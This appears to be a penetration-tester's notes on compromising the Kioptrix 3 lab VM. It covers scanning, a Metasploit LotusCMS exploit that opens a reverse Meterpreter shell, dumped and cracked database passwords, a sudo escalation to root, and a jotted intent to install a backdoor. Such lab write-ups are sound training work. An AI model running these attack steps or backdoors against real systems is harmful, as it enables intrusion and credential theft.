> check on how to install backdoor

```
192.168.56.101
```
## Nmap Results
<pre style="font-size: 12px";>
PORT   STATE SERVICE VERSION
<font color=red>22</font>/tcp open  ssh     OpenSSH<font color=red> 4.7p1</font> Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
<font color=red>80</font>/tcp open  http    Apache httpd<font color=red> 2.2.8</font> ((Ubuntu) <font color=red>PHP</font>/<font color=red>5.2.4</font>-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Ligoat Security - Got Goat? Security ...
|_http-server-header: Apache/<font color=red>2.2.8</font> (Ubuntu) <font color=red>PHP</font>/<font color=red>5.2.4</font>-2ubuntu5.6 with Suhosin-Patch
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre>

## Dirb Results
Note: Reformatted and deleted files where size = 0.
<pre style="font-size: 12px";>
Files:
kioptrix3.com/cache/index.html (CODE:200|SIZE:1819)
kioptrix3.com/data (CODE:<font color=red>403</font>|SIZE:325)
kioptrix3.com/favicon.ico (CODE:200|SIZE:23126)
kioptrix3.com/gallery/index.php (CODE:<font color=red>500</font>|SIZE:5650)
kioptrix3.com/index.php (CODE:200|SIZE:1819)
kioptrix3.com/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)
kioptrix3.com/phpmyadmin/index.php (CODE:200|SIZE:8136)
kioptrix3.com/phpmyadmin/libraries (CODE:<font color=red>403</font>|SIZE:341)
kioptrix3.com/server-status (CODE:<font color=red>403</font>|SIZE:334)
kioptrix3.com/style/admin.php (CODE:200|SIZE:356)
---
http://kioptrix3.com/gallery/gadmin/ --> Login page
http://kioptrix3.com/index.php?system=Admin --> Login page
---

Directories:
kioptrix3.com/cache/
kioptrix3.com/core/
kioptrix3.com/core/controller/
kioptrix3.com/core/lib/
kioptrix3.com/core/model/
kioptrix3.com/core/view/
kioptrix3.com/gallery/
kioptrix3.com/gallery/photos/
kioptrix3.com/gallery/themes/
kioptrix3.com/modules/
kioptrix3.com/phpmyadmin/ --> Login page
kioptrix3.com/phpmyadmin/js/
kioptrix3.com/phpmyadmin/lang/
kioptrix3.com/phpmyadmin/scripts/
kioptrix3.com/phpmyadmin/themes/
kioptrix3.com/style/
</pre>

<pre style="font-size: 12px";>
msf5 exploit(multi/http/lcms_php_exec) > set rhosts kioptrix3.com
msf5 exploit(multi/http/lcms_php_exec) > set uri index.php?system=Admin
msf5 exploit(multi/http/lcms_php_exec) > run

[*] Started reverse TCP handler on 192.168.56.157:4444
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Sending stage (38288 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.157:4444 -> 192.168.56.101:57279) at 2022-07-26 04:33:26 -0400

meterpreter > shell
</pre>

OS Info:
- Linux Kioptrix3<font color=red> 2.6.24-24</font>-server 
- Ubuntu <font color=red>8.04.3</font> LTS
- /bin/bash: ELF <font color=red>32-bit</font> LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.8, dynamically linked (uses shared libs), stripped

Mysql  Ver 14.12 Distrib <font color=red>5.0.51a</font>, for debian-linux-gnu (i486) using readline 5.2

MySql Credentials:
<pre style="font-size: 12px";>
\$GLOBALS["gallarific_mysql_username"] = "root";
\$GLOBALS["gallarific_mysql_password"] = "fuckeyou";

root:*47FB3B1E573D80F44CD198DC65DE7764795F948E
localhost:*F46D660C8ED1B312A40E366A86D958C6F1EF2AB8

mysql> select * from dev_accounts;
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | -> Mast3r
|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | -> starwars
+----+------------+----------------------------------+
</pre>

user `dreg` can't do anything. 
<pre style="font-size: 12px";>
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
</pre>

![[Screenshot (326).png]]

<pre style="font-size: 12px";>
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (ALL) NOPASSWD: ALL
loneferret@Kioptrix3:~$ sudo su
root@Kioptrix3:/home/loneferret# cd /root
root@Kioptrix3:~# ls
Congrats.txt  ht-2.0.18
root@Kioptrix3:~# cat Congrats.txt
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.
.. SNIP ...
</pre>

